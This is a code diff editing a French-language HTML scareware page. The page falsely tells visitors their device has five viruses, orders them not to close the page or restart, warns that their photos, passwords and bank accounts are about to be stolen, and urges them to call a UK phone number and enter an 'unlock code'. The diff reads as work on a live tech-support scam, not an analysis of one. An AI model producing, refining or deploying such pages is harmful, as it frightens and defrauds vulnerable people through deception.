@@ -94,9 +94,10 @@
 </head>
 <body>
     <div class="container">
-        <p class="message"> 🚨 ATTENTION ! 🚨5 VIRUS DÉTECTÉS SUR VOTRE APPAREIL !
+    <p class="alert-number">+44 741 30 52 610</p>
+        <p class="message"> 🚨 ATTENTION !<br>Appelez immédiatement :</p>
 🛑 Votre système est compromis ! 🛑🔴 Ne fermez PAS cette page ! 🔴🔴 Ne redémarrez PAS votre appareil ! 🔴
-📛 Votre appareil est exposé à une attaque sérieuse ! 📛Toutes vos données personnelles (photos, mots de passe, comptes bancaires) risquent d’être volées à tout moment.   <br>Appelez immédiatement :</p>
+            📛Toutes vos données personnelles (photos, mots de passe, comptes bancaires) risquent d’être volées à tout moment.   <br>Appelez immédiatement :</p>
         <p class="alert-number">+44 741 30 52 610</p>
         <p style="font-size: 2vw;">Entrez le code de déverrouillage :</p> <!-- Taille de police réduite -->
         <input type="password" id="codeInput" placeholder="Code secret">
